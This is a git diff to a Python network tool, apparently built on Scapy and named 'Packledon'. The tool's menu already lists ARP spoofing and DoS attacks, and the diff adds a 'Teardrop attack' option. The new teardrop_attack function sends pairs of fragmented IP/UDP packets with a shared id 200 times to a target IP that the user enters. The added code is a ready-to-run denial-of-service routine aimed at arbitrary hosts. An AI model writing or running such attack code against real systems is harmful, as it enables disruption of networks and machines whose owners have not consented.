@@ -9,7 +9,7 @@ import ipaddress
 f = Figlet(font='slant')
 print(f.renderText('Packledon'))
 
-print("What would you like to do?\n1. Scan for devices on the network\n2. Create a pcap?\n3. Examin a pcap?\n4. Perform an arp spoof attack?\n5. Perform a Dos attack?")
+print("What would you like to do?\n1. Scan for devices on the network\n2. Create a pcap?\n3. Examin a pcap?\n4. Perform an arp spoof attack?\n5. Perform a Dos attack?\n6. Perform a Teardrop attack?")
 user_determination= input("Please enter your selection from the above choices:" )
 print(user_determination)
 
@@ -149,20 +149,20 @@ def dos_attack():
 
 
 
-
 def packet_handler(packet):
     print(packet.summary())
     
 
 
-
-
-
-
-
-
-
-
+def teardrop_attack():
+    target_ip = input("Please enter the target IP address for the teardrop attack: ")
+    counter=0
+    while counter<200:
+        frag1 = IP(dst=target_ip, id=42, frag=0, flags="MF")/UDP()/("X"*2400)
+        frag2 = IP(dst=target_ip, id=42, frag=1, flags="MF")/UDP()/("X"*2400)
+        send(frag1)
+        send(frag2)
+        counter=counter+1
 
 if user_determination == "1":
     arp_and_ping_scanning()
@@ -179,6 +179,8 @@ elif user_determination == "4":
 elif user_determination == "5":
     dos_attack()
 
+elif user_determination == "6":
+    teardrop_attack()
 else:
     print("Please enter a valid selection")
 
